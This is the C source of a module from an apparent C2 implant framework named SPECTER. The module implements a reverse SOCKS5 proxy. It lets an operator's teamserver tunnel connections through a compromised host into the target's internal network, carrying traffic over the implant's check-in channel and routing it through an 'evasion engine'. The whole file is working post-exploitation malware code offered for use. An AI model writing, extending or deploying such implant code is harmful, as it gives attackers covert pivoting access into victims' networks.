/**
 * SPECTER Module — SOCKS5 Reverse Proxy
 *
 * Reverse SOCKS5 architecture: the implant initiates all connections
 * outbound — no listening socket on the target.  The teamserver hosts
 * a SOCKS5 listener; operator tools (proxychains, browser, etc.)
 * connect there.  Connection requests and tunnel data flow through
 * the normal tasking/check-in channel via bus->output().
 *
 * Subcommands:
 *   "start"  — begin processing SOCKS requests (long-running)
 *   "stop"   — gracefully tear down all tunnels
 *   "status" — report active connection count
 *
 * Wire protocol between teamserver and module (via task args / output):
 *
 *   SOCKS_MSG header (8 bytes):
 *     [2B conn_id][1B msg_type][1B flags][4B payload_len]
 *   followed by payload_len bytes of data.
 *
 *   msg_type values:
 *     0x01 CONNECT_REQ   — teamserver → implant (target addr+port)
 *     0x02 CONNECT_RSP   — implant → teamserver (success/fail)
 *     0x03 DATA          — bidirectional tunnel data
 *     0x04 CLOSE         — either direction, connection teardown
 *     0x05 KEEPALIVE     — heartbeat (empty payload)
 *
 * Build: make modules  (produces build/modules/socks5.bin)
 */

#include "module.h"

/* ------------------------------------------------------------------ */
/*  Inline CRT primitives (modules are standalone PIC blobs)           */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s)
{
    SIZE_T len = 0;
    while (s[len]) len++;
    return len;
}

int spec_strcmp(const char *a, const char *b)
{
    while (*a && (*a == *b)) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

void *spec_memset(void *dst, int c, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    while (n--) *d++ = (BYTE)c;
    return dst;
}

void *spec_memcpy(void *dst, const void *src, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
    return dst;
}

/* ------------------------------------------------------------------ */
/*  SOCKS5 constants                                                   */
/* ------------------------------------------------------------------ */

#define SOCKS5_VERSION          0x05
#define SOCKS5_AUTH_NONE        0x00
#define SOCKS5_AUTH_NO_ACCEPT   0xFF

#define SOCKS5_CMD_CONNECT      0x01
#define SOCKS5_ATYP_IPV4        0x01
#define SOCKS5_ATYP_DOMAIN      0x03
#define SOCKS5_ATYP_IPV6        0x04

#define SOCKS5_REP_SUCCESS      0x00
#define SOCKS5_REP_GENERAL_FAIL 0x01
#define SOCKS5_REP_NOT_ALLOWED  0x02
#define SOCKS5_REP_NET_UNREACH  0x06
#define SOCKS5_REP_HOST_UNREACH 0x04
#define SOCKS5_REP_CMD_UNSUP    0x07

/* ------------------------------------------------------------------ */
/*  Wire protocol message types                                        */
/* ------------------------------------------------------------------ */

#define MSG_CONNECT_REQ         0x01
#define MSG_CONNECT_RSP         0x02
#define MSG_DATA                0x03
#define MSG_CLOSE               0x04
#define MSG_KEEPALIVE           0x05

/* ------------------------------------------------------------------ */
/*  Module configuration                                               */
/* ------------------------------------------------------------------ */

#define MAX_CONNECTIONS         16
#define RECV_BUF_SIZE           4096
#define MAX_CHUNK_SIZE          3072   /* per-check-in chunk limit      */
#define DEFAULT_THROTTLE_MS     50     /* inter-chunk throttle (ms)     */
#define CONN_TIMEOUT_MS         10000  /* connect timeout               */

/* Connection state */
#define CONN_FREE               0
#define CONN_CONNECTING          1
#define CONN_ESTABLISHED         2
#define CONN_CLOSING             3

/* Network protocol for bus API */
#define PROTO_TCP               0

/* ------------------------------------------------------------------ */
/*  SOCKS_MSG — wire protocol header                                   */
/* ------------------------------------------------------------------ */

#pragma pack(push, 1)
typedef struct _SOCKS_MSG {
    WORD    conn_id;        /* Connection identifier (1-based)          */
    BYTE    msg_type;       /* MSG_* constant                           */
    BYTE    flags;          /* Reserved / future use                    */
    DWORD   payload_len;    /* Length of following payload bytes         */
} SOCKS_MSG;
#pragma pack(pop)

#define SOCKS_MSG_HDR_SIZE  8

/* ------------------------------------------------------------------ */
/*  SOCKS_CONN — per-connection state                                  */
/* ------------------------------------------------------------------ */

typedef struct _SOCKS_CONN {
    WORD    conn_id;            /* Wire-protocol connection ID          */
    BYTE    state;              /* CONN_* state                         */
    HANDLE  socket;             /* Bus network handle                   */
    DWORD   bytes_sent;         /* Total bytes sent this check-in       */
    DWORD   bytes_recv;         /* Total bytes received this check-in   */
} SOCKS_CONN;

/* ------------------------------------------------------------------ */
/*  Module state                                                       */
/* ------------------------------------------------------------------ */

typedef struct _SOCKS5_STATE {
    SOCKS_CONN  conns[MAX_CONNECTIONS];
    DWORD       active_count;
    BOOL        running;
    DWORD       throttle_ms;    /* Per-chunk throttle in milliseconds   */
} SOCKS5_STATE;

/* ------------------------------------------------------------------ */
/*  Helper: resolve Sleep function pointer                             */
/* ------------------------------------------------------------------ */

typedef void (*FN_SLEEP)(DWORD dwMilliseconds);

static FN_SLEEP resolve_sleep(MODULE_BUS_API *api)
{
    return (FN_SLEEP)api->resolve("kernel32.dll", "Sleep");
}

/* ------------------------------------------------------------------ */
/*  Helper: find free connection slot                                  */
/* ------------------------------------------------------------------ */

static SOCKS_CONN *find_free_slot(SOCKS5_STATE *state)
{
    DWORD i;
    for (i = 0; i < MAX_CONNECTIONS; i++) {
        if (state->conns[i].state == CONN_FREE)
            return &state->conns[i];
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Helper: find connection by ID                                      */
/* ------------------------------------------------------------------ */

static SOCKS_CONN *find_conn(SOCKS5_STATE *state, WORD conn_id)
{
    DWORD i;
    for (i = 0; i < MAX_CONNECTIONS; i++) {
        if (state->conns[i].state != CONN_FREE &&
            state->conns[i].conn_id == conn_id)
            return &state->conns[i];
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Helper: send a SOCKS_MSG via bus output                            */
/* ------------------------------------------------------------------ */

static BOOL send_msg(MODULE_BUS_API *api, WORD conn_id, BYTE msg_type,
                     BYTE flags, const BYTE *payload, DWORD payload_len)
{
    BYTE buf[SOCKS_MSG_HDR_SIZE + MAX_CHUNK_SIZE];
    SOCKS_MSG *hdr;
    DWORD total;

    total = SOCKS_MSG_HDR_SIZE + payload_len;
    if (total > sizeof(buf))
        return FALSE;

    hdr = (SOCKS_MSG *)buf;
    hdr->conn_id    = conn_id;
    hdr->msg_type   = msg_type;
    hdr->flags      = flags;
    hdr->payload_len = payload_len;

    if (payload && payload_len > 0)
        spec_memcpy(buf + SOCKS_MSG_HDR_SIZE, payload, payload_len);

    return api->output(buf, total, OUTPUT_BINARY);
}

/* ------------------------------------------------------------------ */
/*  Helper: close a connection                                         */
/* ------------------------------------------------------------------ */

static void close_conn(MODULE_BUS_API *api, SOCKS5_STATE *state,
                        SOCKS_CONN *conn, BOOL notify)
{
    if (conn->state == CONN_FREE)
        return;

    if (conn->socket && conn->socket != INVALID_HANDLE_VALUE)
        api->net_close(conn->socket);

    if (notify)
        send_msg(api, conn->conn_id, MSG_CLOSE, 0, NULL, 0);

    if (conn->state != CONN_FREE && state->active_count > 0)
        state->active_count--;

    spec_memset(conn, 0, sizeof(SOCKS_CONN));
    conn->state = CONN_FREE;
}

/* ------------------------------------------------------------------ */
/*  Handle CONNECT_REQ from teamserver                                 */
/*                                                                     */
/*  Payload format:                                                    */
/*    [1B atyp][variable addr][2B port_be]                             */
/*    atyp 0x01: [4B ipv4]                                             */
/*    atyp 0x03: [1B domain_len][domain]                               */
/*    atyp 0x04: [16B ipv6] (not supported, reply fail)                */
/* ------------------------------------------------------------------ */

static void handle_connect_req(MODULE_BUS_API *api, SOCKS5_STATE *state,
                                const SOCKS_MSG *msg, const BYTE *payload)
{
    SOCKS_CONN *conn;
    BYTE atyp;
    char addr_buf[256];
    DWORD port;
    DWORD offset = 0;
    HANDLE sock;
    BYTE rsp;

    /* Find or allocate connection slot */
    conn = find_conn(state, msg->conn_id);
    if (!conn) {
        conn = find_free_slot(state);
        if (!conn) {
            /* No free slots — reject */
            rsp = SOCKS5_REP_GENERAL_FAIL;
            send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
            return;
        }
        conn->conn_id = msg->conn_id;
        conn->state   = CONN_CONNECTING;
        state->active_count++;
    }

    if (msg->payload_len < 3) {
        rsp = SOCKS5_REP_GENERAL_FAIL;
        send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
        close_conn(api, state, conn, FALSE);
        return;
    }

    atyp = payload[offset++];

    spec_memset(addr_buf, 0, sizeof(addr_buf));

    if (atyp == SOCKS5_ATYP_IPV4) {
        /* 4 bytes IPv4 */
        if (msg->payload_len < 7) {
            rsp = SOCKS5_REP_GENERAL_FAIL;
            send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
            close_conn(api, state, conn, FALSE);
            return;
        }
        /* Format as dotted decimal */
        {
            BYTE b0 = payload[offset], b1 = payload[offset+1];
            BYTE b2 = payload[offset+2], b3 = payload[offset+3];
            char *p = addr_buf;
            /* Simple integer-to-string for each octet */
            DWORD octets[4];
            DWORD oi;
            octets[0] = b0; octets[1] = b1; octets[2] = b2; octets[3] = b3;
            for (oi = 0; oi < 4; oi++) {
                DWORD val = octets[oi];
                if (val >= 100) { *p++ = (char)('0' + val / 100); val %= 100; *p++ = (char)('0' + val / 10); *p++ = (char)('0' + val % 10); }
                else if (val >= 10) { *p++ = (char)('0' + val / 10); *p++ = (char)('0' + val % 10); }
                else { *p++ = (char)('0' + val); }
                if (oi < 3) *p++ = '.';
            }
            *p = '\0';
        }
        offset += 4;
    }
    else if (atyp == SOCKS5_ATYP_DOMAIN) {
        BYTE dlen = payload[offset++];
        if (offset + dlen + 2 > msg->payload_len || dlen >= sizeof(addr_buf)) {
            rsp = SOCKS5_REP_GENERAL_FAIL;
            send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
            close_conn(api, state, conn, FALSE);
            return;
        }
        spec_memcpy(addr_buf, payload + offset, dlen);
        addr_buf[dlen] = '\0';
        offset += dlen;
    }
    else {
        /* IPv6 or unknown — not supported */
        rsp = SOCKS5_REP_CMD_UNSUP;
        send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
        close_conn(api, state, conn, FALSE);
        return;
    }

    /* Port is 2 bytes big-endian */
    port = ((DWORD)payload[offset] << 8) | (DWORD)payload[offset + 1];

    /* Attempt connection through bus API (routed through evasion engine) */
    sock = api->net_connect(addr_buf, port, PROTO_TCP);
    if (!sock || sock == INVALID_HANDLE_VALUE) {
        rsp = SOCKS5_REP_HOST_UNREACH;
        send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
        close_conn(api, state, conn, FALSE);
        return;
    }

    conn->socket = sock;
    conn->state  = CONN_ESTABLISHED;
    conn->bytes_sent = 0;
    conn->bytes_recv = 0;

    /* Success response */
    rsp = SOCKS5_REP_SUCCESS;
    send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
}

/* ------------------------------------------------------------------ */
/*  Handle DATA from teamserver → forward to target                    */
/* ------------------------------------------------------------------ */

static void handle_data(MODULE_BUS_API *api, SOCKS5_STATE *state,
                         const SOCKS_MSG *msg, const BYTE *payload)
{
    SOCKS_CONN *conn = find_conn(state, msg->conn_id);
    if (!conn || conn->state != CONN_ESTABLISHED) {
        /* Connection not found or not ready — send CLOSE */
        send_msg(api, msg->conn_id, MSG_CLOSE, 0, NULL, 0);
        return;
    }

    if (msg->payload_len > 0) {
        if (!api->net_send(conn->socket, payload, msg->payload_len)) {
            close_conn(api, state, conn, TRUE);
            return;
        }
        conn->bytes_sent += msg->payload_len;
    }
}

/* ------------------------------------------------------------------ */
/*  Handle CLOSE from teamserver                                       */
/* ------------------------------------------------------------------ */

static void handle_close(MODULE_BUS_API *api, SOCKS5_STATE *state,
                          const SOCKS_MSG *msg)
{
    SOCKS_CONN *conn = find_conn(state, msg->conn_id);
    if (conn)
        close_conn(api, state, conn, FALSE); /* Don't echo close back */
}

/* ------------------------------------------------------------------ */
/*  Process incoming message from teamserver                           */
/* ------------------------------------------------------------------ */

static void process_message(MODULE_BUS_API *api, SOCKS5_STATE *state,
                             const BYTE *data, DWORD data_len)
{
    const SOCKS_MSG *msg;
    const BYTE *payload;

    if (data_len < SOCKS_MSG_HDR_SIZE)
        return;

    msg = (const SOCKS_MSG *)data;

    if (SOCKS_MSG_HDR_SIZE + msg->payload_len > data_len)
        return;

    payload = data + SOCKS_MSG_HDR_SIZE;

    switch (msg->msg_type) {
        case MSG_CONNECT_REQ:
            handle_connect_req(api, state, msg, payload);
            break;
        case MSG_DATA:
            handle_data(api, state, msg, payload);
            break;
        case MSG_CLOSE:
            handle_close(api, state, msg);
            break;
        case MSG_KEEPALIVE:
            /* Respond with keepalive */
            send_msg(api, 0, MSG_KEEPALIVE, 0, NULL, 0);
            break;
        default:
            break;
    }
}

/* ------------------------------------------------------------------ */
/*  Poll all established connections for incoming data from targets    */
/* ------------------------------------------------------------------ */

static void poll_connections(MODULE_BUS_API *api, SOCKS5_STATE *state)
{
    BYTE recv_buf[RECV_BUF_SIZE];
    DWORD i, n;
    DWORD chunk;

    for (i = 0; i < MAX_CONNECTIONS; i++) {
        if (state->conns[i].state != CONN_ESTABLISHED)
            continue;

        /* Non-blocking receive from the target socket */
        n = api->net_recv(state->conns[i].socket, recv_buf, sizeof(recv_buf));

        if (n == 0)
            continue;

        /* net_recv returns (DWORD)-1 on error / connection closed */
        if (n == (DWORD)-1) {
            close_conn(api, state, &state->conns[i], TRUE);
            continue;
        }

        /* Send data back to teamserver in chunks */
        {
            DWORD sent = 0;
            while (sent < n) {
                chunk = n - sent;
                if (chunk > MAX_CHUNK_SIZE)
                    chunk = MAX_CHUNK_SIZE;

                send_msg(api, state->conns[i].conn_id, MSG_DATA, 0,
                         recv_buf + sent, chunk);
                sent += chunk;
                state->conns[i].bytes_recv += chunk;
            }
        }
    }
}

/* ------------------------------------------------------------------ */
/*  Subcommand: start — main SOCKS5 processing loop                    */
/* ------------------------------------------------------------------ */

static DWORD cmd_start(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    SOCKS5_STATE state;
    FN_SLEEP fn_sleep;
    DWORD throttle;

    spec_memset(&state, 0, sizeof(SOCKS5_STATE));

    /* Optional throttle argument (ms between poll cycles) */
    throttle = module_arg_int32(args, 1, DEFAULT_THROTTLE_MS);
    state.throttle_ms = throttle;
    state.running     = TRUE;

    fn_sleep = resolve_sleep(api);
    if (!fn_sleep) {
        MODULE_OUTPUT_ERROR(api, "socks5: failed to resolve Sleep");
        return MODULE_ERR_RESOLVE;
    }

    MODULE_OUTPUT_TEXT(api, "socks5: proxy started");

    /*
     * Main loop: the module runs as a long-lived task.  Each iteration:
     * 1. Check for incoming messages from teamserver (delivered as task args
     *    via the module bus — the bus populates a message queue that we
     *    read through bus->file_read on a special path "\\.\socks\inbox").
     * 2. Poll all active connections for data from targets.
     * 3. Sleep for throttle_ms to control bandwidth.
     *
     * The loop exits when a "stop" message is received or the module is
     * terminated by the guardian thread.
     */
    while (state.running) {
        BYTE inbox[4096];
        DWORD inbox_len;
        DWORD offset;

        /* Read pending messages from the module inbox.
         * The bus maps "\\.\socks\inbox" to the module's inbound task queue.
         * Returns 0 if no messages pending. */
        inbox_len = api->file_read("\\\\.\\ socks\\inbox", inbox, sizeof(inbox));

        if (inbox_len > 0 && inbox_len != (DWORD)-1) {
            /* Process all messages in the inbox buffer.
             * Messages are concatenated: [hdr+payload][hdr+payload]... */
            offset = 0;
            while (offset + SOCKS_MSG_HDR_SIZE <= inbox_len) {
                const SOCKS_MSG *hdr = (const SOCKS_MSG *)(inbox + offset);
                DWORD msg_total = SOCKS_MSG_HDR_SIZE + hdr->payload_len;

                if (offset + msg_total > inbox_len)
                    break;

                /* Check for stop signal (CLOSE with conn_id 0) */
                if (hdr->msg_type == MSG_CLOSE && hdr->conn_id == 0) {
                    state.running = FALSE;
                    break;
                }

                process_message(api, &state, inbox + offset, msg_total);
                offset += msg_total;
            }
        }

        /* Poll established connections for data from targets */
        poll_connections(api, &state);

        /* Throttle to control bandwidth and CPU usage */
        fn_sleep(state.throttle_ms);
    }

    /* Tear down all active connections */
    {
        DWORD i;
        for (i = 0; i < MAX_CONNECTIONS; i++) {
            if (state.conns[i].state != CONN_FREE)
                close_conn(api, &state, &state.conns[i], TRUE);
        }
    }

    MODULE_OUTPUT_TEXT(api, "socks5: proxy stopped");
    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: stop — signal the running instance to stop             */
/* ------------------------------------------------------------------ */

static DWORD cmd_stop(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    /* Send a CLOSE with conn_id=0 as the stop signal.
     * The teamserver relays this to the running socks5 instance
     * via the module inbox. */
    send_msg(api, 0, MSG_CLOSE, 0, NULL, 0);
    MODULE_OUTPUT_TEXT(api, "socks5: stop signal sent");
    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: status — report active connection count                */
/* ------------------------------------------------------------------ */

static DWORD cmd_status(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    /* Status is reported by the long-running instance.
     * This subcommand sends a keepalive which triggers a status response. */
    send_msg(api, 0, MSG_KEEPALIVE, 0, NULL, 0);
    MODULE_OUTPUT_TEXT(api, "socks5: status request sent");
    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Module entry point                                                 */
/* ------------------------------------------------------------------ */

DWORD module_entry(MODULE_BUS_API *api, BYTE *args_raw, DWORD args_len)
{
    MODULE_ARGS  args;
    const char  *subcmd;

    if (!module_parse_args(args_raw, args_len, &args)) {
        MODULE_OUTPUT_ERROR(api, "socks5: failed to parse arguments");
        return MODULE_ERR_ARGS;
    }

    subcmd = module_arg_string(&args, 0);
    if (!subcmd) {
        MODULE_OUTPUT_ERROR(api, "socks5: missing subcommand (start|stop|status)");
        return MODULE_ERR_ARGS;
    }

    if (spec_strcmp(subcmd, "start") == 0)
        return cmd_start(api, &args);

    if (spec_strcmp(subcmd, "stop") == 0)
        return cmd_stop(api, &args);

    if (spec_strcmp(subcmd, "status") == 0)
        return cmd_status(api, &args);

    MODULE_OUTPUT_ERROR(api, "socks5: unknown subcommand");
    return MODULE_ERR_UNSUPPORTED;
}
